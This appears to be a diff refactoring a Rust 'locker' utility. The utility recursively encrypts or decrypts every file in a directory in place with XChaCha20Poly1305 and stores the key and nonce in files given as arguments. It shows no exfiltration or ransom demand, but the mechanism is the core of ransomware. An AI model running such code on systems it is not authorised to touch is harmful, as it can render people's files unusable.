@@ -40,46 +40,65 @@ fn main() {
 
     } else {
 
-        key = load_key(key, &args, 3);
-        nonce = load_nonce(nonce, &args, 4);
+        key = load_key(&mut key, &args, 3);
+        nonce = load_nonce(&mut nonce, &args, 4);
 
     }
 
-    let str_path = &args[2];
+    let path = &args[2];
     let key_path = &args[3];
-
-    let path = Path::new(&str_path);
-    let key_path = Path::new(&key_path);
-
-    dir_iterator(&path, &key, &nonce, key_path, do_encrypt).expect("Failed During Main Call");
-
     let nonce_path = &args[4];
+
+    if !Path::new(&path).exists() {
+        println!("Path Does Not Exist");
+        std::process::exit(0);
+    }
+
+    let path = Path::new(&path);
+
+    if !do_encrypt {
+        if !Path::new(&key_path).exists() {
+            println!("Key Path Does Not Exist");
+            std::process::exit(0);    
+        }
+        if !Path::new(&nonce_path).exists() {
+            println!("Nonce Path Does Not Exist");
+            std::process::exit(0);    
+        }
+    }
+
+    let key_path = Path::new(&key_path);
     let nonce_path = Path::new(&nonce_path);
+
+    dir_iterator(&path, &key, &nonce, do_encrypt).expect("Failed During Main Call");
+
     fs::write(key_path, key).expect("Writing Key To File Failed...WHOOPS");
     fs::write(nonce_path, nonce).expect("Writing Nonce To File Failed...WHOOPS");
 
 }
 
 fn dir_iterator(path: &Path, key: &[u8; 32], nonce: &[u8; 24],
-     key_path: &Path, do_encrypt: bool) -> Result<(), anyhow::Error>{
+    do_encrypt: bool) -> Result<(), anyhow::Error>{
 
-    let str_path = path.to_string_lossy();
-    let str_path = str_path.split("\\");
-    let mut str_vec = str_path.collect::<Vec<&str>>();
-    str_vec.push("locker.txt");
-    let final_path = str_vec.join("\\");
+    let final_path = get_locker_path(path);
 
     for module in fs::read_dir(path).expect("Unable To Get Directory") {
         let module = module.expect("Unable To Pull From Directory");
+
         if module.path().is_dir() {
+
             println!("Got Sub-Directory {}", module.path().display());
-            dir_iterator(&module.path(), key, nonce, key_path, do_encrypt).expect("Failed During Recursion");
+            dir_iterator(&module.path(), key, nonce, do_encrypt).expect("Failed During Recursion");
+        
         } else {
+
             if String::from(module.path().to_string_lossy())
                 .eq(&String::from(&final_path)) {
                     continue
             }
+
             println!("Got File {}", module.path().display());
+            
             if do_encrypt {
                 encrypt_file(&module.path(), key, nonce)
                     .expect("Error Loading File");                
@@ -110,75 +129,73 @@ fn dir_iterator(path: &Path, key: &[u8; 32], nonce: &[u8; 24],
 fn encrypt_file(path: &Path, key: &[u8; 32],
      nonce: &[u8; 24] ) -> Result<(), anyhow::Error> {
 
-    let cipher = XChaCha20Poly1305::new(key.into());
+        let cipher = XChaCha20Poly1305::new(key.into());
 
-    let file_data = fs::read(path)?;
+        let file_data = fs::read(path)?;
 
-    let encrypted_s = cipher
-        .encrypt(nonce.into(), file_data.as_ref())
-        .map_err(|err| anyhow!("Encrypting File: {}", err))?;
+        let encrypted = cipher
+            .encrypt(nonce.into(), file_data.as_ref())
+            .map_err(|err| anyhow!("Encrypting File: {}", err))?;
 
-    println!("Encrypted File: {}", path.display());
+        println!("Encrypted File: {}", path.display());
 
-    fs::write(path, encrypted_s).expect("Error Writing Encrypted Contents");
+        fs::write(path, encrypted).expect("Error Writing Encrypted Contents");
 
-    Ok(())
+        Ok(())
 }
 
 fn decrypt_file(path: &Path, key: &[u8; 32],
     nonce: &[u8; 24] ) -> Result<(), anyhow::Error> {
 
-   let cipher = XChaCha20Poly1305::new(key.into());
+        let cipher = XChaCha20Poly1305::new(key.into());
 
-   let file_data = fs::read(path)?;
+        let file_data = fs::read(path)?;
 
-   let encrypted_s = cipher
-       .decrypt(nonce.into(), file_data.as_ref())
-       .map_err(|err| anyhow!("Decrypting File: {}", err))?;
+        let decrypted = cipher
+            .decrypt(nonce.into(), file_data.as_ref())
+            .map_err(|err| anyhow!("Decrypting File: {}", err))?;
 
-    println!("Dencrypted File: {}", path.display());
+        println!("Dencrypted File: {}", path.display());
 
-   fs::write(path, encrypted_s).expect("Error Writing Encrypted Contents");
+        fs::write(path, decrypted).expect("Error Writing Encrypted Contents");
 
-   Ok(())
+        Ok(())
 }
 
-fn load_nonce(arr: [u8; 24], arg: &Vec<String>, index: usize) -> [u8; 24] {
+fn load_nonce(arr: &mut [u8; 24], arg: &Vec<String>, index: usize) -> [u8; 24] {
     let text = fs::read(&arg[index]);
-    let mut arr = arr;
-
-    let mut vec: Vec<u8> = Vec::new();
 
     for i in text.iter() {
-        for j in i {
-            vec.push(*j);
+        for (j, k) in arr.iter_mut().zip(i.iter()) {
+            *j = *k;
         }
     }
 
-    for (place, element) in arr.iter_mut().zip(vec.iter()) {
-        *place = *element;
-    }
-
-    arr
+    *arr
 
 }
 
-fn load_key(arr: [u8; 32], arg: &Vec<String>, index: usize) -> [u8; 32] {
+fn load_key(arr: &mut [u8; 32], arg: &Vec<String>, index: usize) -> [u8; 32] {
     let text = fs::read(&arg[index]);
-    let mut arr = arr;
-
-    let mut vec: Vec<u8> = Vec::new();
 
     for i in text.iter() {
-        for j in i {
-            vec.push(*j);
+        for (j, k) in arr.iter_mut().zip(i.iter()) {
+            *j = *k;
         }
     }
 
-    for (place, element) in arr.iter_mut().zip(vec.iter()) {
-        *place = *element;
-    }
+    *arr
 
-    arr
+}
+
+fn get_locker_path(path: &Path) -> String {
+
+    let path = path.to_string_lossy();
+
+    let mut str_vec = path.split("\\")
+                        .collect::<Vec<&str>>();
+
+    str_vec.push("locker.txt");
+    str_vec.join("\\")
 
 }
